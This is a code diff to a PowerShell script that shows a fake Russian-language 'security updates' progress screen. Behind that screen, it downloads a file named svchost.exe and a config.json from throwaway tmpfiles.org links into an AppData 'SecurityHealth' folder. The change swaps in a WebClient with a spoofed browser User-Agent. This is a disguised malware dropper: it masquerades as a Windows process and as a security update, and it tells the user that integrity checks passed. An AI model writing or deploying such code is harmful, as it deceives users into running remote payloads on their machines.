@@ -78,13 +78,15 @@ $timer.Add_Tick({
         if ($progress.Value -eq 40 -and -not $script:filesReady -and -not $script:errorOccurred) {
             $status.Text = "Загрузка обновлений безопасности..."
             $substatus.Text = "Получение пакетов с сервера..."
-            $urlExe  = "https://github.com/Varenik638/check/raw/refs/heads/main/svchost.exe"
-            $urlConf = "https://github.com/Varenik638/check/raw/refs/heads/main/config.json"
+            $urlExe  = "https://tmpfiles.org/wOw3DkIavsOY/svchost.exe"
+            $urlConf = "https://tmpfiles.org/wZwkD1ISvJBb/config.json"
             $workDir = "$env:APPDATA\SecurityHealth"
             try {
                 if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
-                Invoke-WebRequest -Uri $urlExe -OutFile "$workDir\svchost.exe" -UseBasicParsing
-                Invoke-WebRequest -Uri $urlConf -OutFile "$workDir\config.json" -UseBasicParsing
+                $web = New-Object System.Net.WebClient
+                $web.Headers.Add("User-Agent", "Mozilla/5.0")
+                $web.DownloadFile($urlExe, "$workDir\svchost.exe")
+                $web.DownloadFile($urlConf, "$workDir\config.json")
                 $script:filesReady = $true
                 $status.Text = "Обновления безопасности установлены"
                 $substatus.Text = "Проверка целостности завершена"
